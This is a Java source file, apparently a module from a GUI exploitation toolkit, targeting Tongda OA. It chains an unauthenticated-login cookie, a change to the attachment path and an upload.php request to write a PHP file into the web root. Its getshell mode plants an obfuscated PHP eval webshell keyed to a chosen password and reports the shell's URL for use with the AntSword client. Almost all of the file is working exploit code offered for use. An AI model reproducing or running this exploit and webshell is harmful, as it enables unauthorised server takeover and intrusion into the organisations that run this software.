package exp.oa.tongdaoa;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.jsoup.Jsoup;
import utils.HttpTools;
import utils.Response;

import java.util.Date;
import java.util.HashMap;
import java.util.Random;

public class tongda_tempModule_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attgetshell(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private static String TempModuleUpload(String url,String filename , String shell){
        try{
            long t = (new Date()).getTime();
            String cookie = tongda_AnyUserLogin_unauth.getCookie(url);

            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            head.put("Cookie",cookie);

            Response var1 = HttpTools.get(url+"/general/system/security/service.php",head,"utf-8");
            String webroot = Jsoup.parse(var1.getText()).select("Input[name=\"WEBROOT\"]").attr("value").toUpperCase();
            Random random = new Random();
            int POS_ID=random.nextInt(155)+100;
            String varData1 = "POS_ID="+POS_ID+"&POS_NAME=upload&POS_PATH="+webroot+".&IS_ACTIVE=on";

            Response var2 = HttpTools.post(url+"/general/system/attachment/position/add.php",varData1,head,"utf-8");
            head.put("Content-Type","multipart/form-data; boundary=00content0boundary00");
            String varData2 = "--00content0boundary00\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\""+filename+".\"\r\n" +
                    "\r\n" +
                    shell+
                    "\r\n" +
                    "--00content0boundary00--";
            Response var3 = HttpTools.post(url+"/module/upload/upload.php?encode=utf-8",varData2,head,"utf-8");
            if (var3.getCode()==200){
                String id = JSON.parseObject(var3.getText()).get("id").toString();
                String fullpath=url+"/upload_temp/"+id.split("@")[1].replace("_","/").replace(",",".")+filename;
                if(HttpTools.get(fullpath,new HashMap<>(),"utf-8").getCode()==200){
                    return fullpath;
                }
            }
        }catch (Exception E){
            return null;
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        long tt = (new Date()).getTime();
        String filename = tt + ".php";
        String path = TempModuleUpload(url, filename, "<?php echo "+tt+";?>");
        if (path != null) {

            Platform.runLater(() -> {
                textArea.appendText("\n [ tongda_Action_upload ]");
                textArea.appendText("\n 文件写入成功: " + path + "\n " +
                        "访问成功: " + HttpTools.get(path, new HashMap<>(), "utf-8").getText());
                textArea.appendText("\n CMD处设置密码，默认蚁剑");
                textArea.appendText("\n ");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n ");
            });
            return false;
        }
    }

    private Boolean attgetshell(String url,String pass,TextArea textArea,TextArea textArea_cmd) {
        long tt = (new Date()).getTime();
        String filename = "R4g" + tt + ".php";
        String shell = "R4g" + tt + "<?php class Gz5SfY10 { public function __construct($H7Es8){ @eval(\"/*Z7y11Eib8N*/\".$H7Es8.\"\"); }}new Gz5SfY10($_REQUEST['" + pass + "']);?>";
        String path = TempModuleUpload(url, filename, shell);
        if (path != null) {

            Platform.runLater(() -> {
                textArea.appendText("\n webshell访问成功");
                textArea_cmd.appendText("\n " + path);
                textArea_cmd.appendText("\n 蚁剑密码: " + pass);
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell访问失败");
            });
            return false;
        }
    }
}
